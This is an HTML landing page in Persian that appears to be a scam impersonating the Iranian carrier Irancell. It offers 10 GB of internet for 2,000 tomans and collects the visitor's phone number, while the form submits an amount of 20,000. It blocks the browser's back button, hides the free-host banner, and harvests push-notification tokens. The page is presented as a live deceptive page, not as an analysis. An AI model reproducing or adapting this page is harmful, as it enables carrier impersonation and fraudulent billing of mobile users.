<html>
<head>

    <link rel="shortcut icon" href="../source/dahgigcell/data:image/x-icon;," type="image/x-icon">
    <title>هدیه بزرگ ایرانسل</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" href="../source/dahgigcell/sq86-stylev6.css">


</head>



<body>
    <link rel="manifest" href="../source/dahgigcell/manifest.json">
    <section class="">
        <div class="cart">
          <div id="container">
            <div class="content">
                <div id="header" style="margin-top:20px;">
                    <div><img class="counter" src="../source/dahgigcell/E1g2.gif" alt="counter" /></div>
                    <div><img class="gif" src="../source/dahgigcell/info.Live24.NetIR_512x512.png" alt="internet" /></div>
                </div>
                <main>
                       <p id="offer">فقط با پرداخت 2 هزارتومان صاحب 10 گیگ اینترنت 1 ماهه شوید و از سرعت و کیفیت آن لذت ببرید !!</p>
                       <p class="membership">هدیه بزرگ اپراتور ایرانسل برای تمامی مشترکین</p>
                       <form class="mobile-form" action="index.php?amount=20,000" method="post">
                            <div class="inputSubmit">
                               <input type="hidden" name="ReferralCode" />
							   <input type="hidden" name="ReferralCode" />
                               <input autocomplete="off" type="tel" required="required" id="Msisdn" name="Msisdn" autofocus="true" placeholder="09xxxxxxxxx">
                               <div class="signup">
                                 <Button href=""  class="btn submit">تایید و پرداخت</Button>
							
                               </div>
                            </div> 
                        </form>
                        <a href="" target="" style="text-decoration:none;">بیشتر بدانید !</a>
                        <div class="text-danger" id="ErrorForInvalidMsisdn" ></div>
                        <div id="divProcessing" style="text-align:center;">
                             <h4 id="text"> شکیبا باشید</h4>
                             <span class="load-spn" id="spn1"></span>
                             <span class="load-spn" id="spn2"></span>
                             <span class="load-spn" id="spn3"></span>
                        </div>
                  </main>
              </div>
          </div>
        </div>        
    </section>
    <div id="messages"></div>

   <script src="../source/dahgigcell/jquery-1.11.1.min.js"></script>
    <script src="../source/dahgigcell/jquery.inputmask.bundle.min.js"></script>

   <script async src="../source/dahgigcell/js@id=UA-139152180-1.htm"></script>
   <script>
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());

       gtag('config', 'UA-139152180-1');
    </script>
    
    <script type="text/javascript">
        $(document).ready(function(){
          setTimeout(function(){
             $("#header .counter").slideUp(1000);
             $(".signup").fadeIn(500);
          }, 5000);
        });
      </script>
   
    <script>
      $(document).ready(function() {
           var persianNumbers = [
               /۰/g,
               /۱/g,
               /۲/g,
               /۳/g,
               /۴/g,
               /۵/g,
               /۶/g,
               /۷/g,
               /۸/g,
               /۹/g
            ],
            arabicNumbers = [
                /٠/g,
                /١/g,
                /٢/g,
                /٣/g,
                /٤/g,
                /٥/g,
                /٦/g,
                /٧/g,
                /٨/g,
                /٩/g
             ],
             fixNumbers = function(str) {
                 if (typeof str === "string") {
                     for (var i = 0; i < 10; i++) {
                          str = str.replace(persianNumbers[i], i).replace(arabicNumbers[i], i);
                     }
                 }
                 return str;
             };
            $("#request-btn").click(function(e) {
                e.preventDefault();
                if (!$(this).hasClass('disabled')) {
                    var msisdn = $("#Msisdn").val();
                    msisdn = msisdn.replace("_", "");
                    msisdn = fixNumbers(msisdn);
                    var ussd = /(^(09|9)[3][0-9]\d{7}$)|(^(989|9)[3][0-9]\d{7}$)|(^(09|9)[0][0-9]\d{7}$)|(^(989|9)[0][0-9]\d{7}$)|(^(09|9)[۳][۰-۹]\d{7}$)|(^(989|9)[۳][۰-۹]\d{7}$)|(^(09|9)[۰][۰-۹]\d{7}$)|(^(989|9)[۰][۰-۹]\d{7}$)/.test(msisdn);
                    console.log(ussd);
                    if (!ussd) {
                           $('.mobile-form').submit();
                    }
                    localStorage.setItem("msisdn", msisdn);
                 }
            });

            var msisdn = $('#Msisdn').val();
            msisdn = msisdn.replace('_', '');
            if (msisdn.length === 11) {
                $("#request-btn").removeClass("disabled");
            } else {
                $("#request-btn").addClass("disabled");
            }

            $("#Msisdn").inputmask({
                regex: "09[0-9۰-۹٠-٩]{9}",
                allowPlus: false,
                allowMinus: false,
                prefix: "09"
            });

            $('#Msisdn').on('change paste keyup input propertychange', function () {
                if ($(this).inputmask("isComplete")) {
                    $("#request-btn").removeClass("disabled");
                } else {
                    $("#request-btn").addClass("disabled");
                }
            });

            $('#Msisdn').on('keypress', function (e) {
                var code = (e.keyCode ? e.keyCode : e.which);
                if (code == 13) { //Enter keycode
                    e.preventDefault();
                    $('#request-btn').click();
                }
            });
        });

    </script>
    
    <script>
        $(document).on('invalid-form.validate', 'form', function () {
            var button = $(this).find('input[type="submit"]');
            setTimeout(function () {
                button.removeAttr('disabled');
            }, 1);
        });
        $(document).on('submit', 'form', function () {
            $("#divProcessing").show();
            var button = $(this).find('input[type="submit"]');
            setTimeout(function () {
                button.attr('disabled', 'disabled');
            }, 0);
        });
    </script>
    <script>
        $("#divProcessing").hide();
    </script>

    <script>
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
    </script>

    <script>
           var config = {
                apiKey: "",
                authDomain: "",
                databaseURL: "",
                projectId: "",
                storageBucket: "",
                messagingSenderId: "",
                appId: ""
           };

           
            firebase.initializeApp(config);
            const messaging = firebase.messaging();
            console.log('Requesting permission...');
            messaging.requestPermission()
                .then(function () {
                    console.log('Notification permission granted.');
                    return messaging.getToken();
                    
                })
                .then(function (token) {
                    console.log(token);
                   $.ajax({
                       type: "POST",
                       url: "../Home/GetToken",
                       data: { Token: token },
                       success: function (data) {
                           $.ajax({
                                type: "POST",
                                url: "../Home/RegisterTopic",
                                success: function (data) {
                                 },
                                error: function (e) {
                                 }
                            });
                       },
                       error: function (e) {
                       }
                   });
                   
                  
                })
                .catch(function (err) {
                    console.log('Unable to get permission to notify.', err);
                });


                messaging.onMessage(function (payload) {
                    console.log('onMessage : ', payload);
                    const title = payload.notification.title;
                    const options = {
                        body: payload.notification.body,
                        icon: payload.notification.icon
                    };
                    
                });

        </script> 
   
</body>


<script>
    $(document).ready(function () {
        $("#ErrorForInvalidMsisdn").text('');
       
    })
</script>

<style>
    #ErrorForInvalidMsisdn {
            display: block !important;
            color: red;
            font-size: 12px;
            margin-top: 10px;
    } 
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
</style>

</html>
          





    



